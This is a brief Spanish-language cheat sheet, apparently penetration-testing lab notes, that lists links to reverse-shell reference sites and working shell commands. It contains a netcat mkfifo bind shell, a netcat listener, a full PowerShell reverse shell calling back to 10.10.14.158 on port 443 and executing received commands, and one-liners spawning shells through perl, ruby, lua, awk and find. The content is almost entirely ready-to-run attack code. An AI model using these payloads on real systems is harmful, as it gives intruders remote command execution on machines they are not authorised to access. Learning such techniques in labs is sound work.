paginas de codigos de shells
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
https://www.revshells.com/
### Bind Shell
logica de habilitar un puerto en equipo remoto para que host atacante se conecte a este.

remoto siendo 10.129.41.200 ip del remoto
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

local siendo 10.129.41.200 ip del remoto
```
nc -nv 10.129.41.200 7777
```

### Reverse Shell
logica de local habilita listener y remoto se va a conectar
```
sudo nc -lvnp 443
```
remoto ejemplo para powershell
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell interactiva
```
/bin/sh -i
```
```
perl -e 'exec "/bin/sh";'
```
```
ruby: exec "/bin/sh"
```
```
lua: os.execute('/bin/sh')
```
```
awk 'BEGIN {system("/bin/sh")}'
```
```
find . -exec /bin/sh \; -quit
```
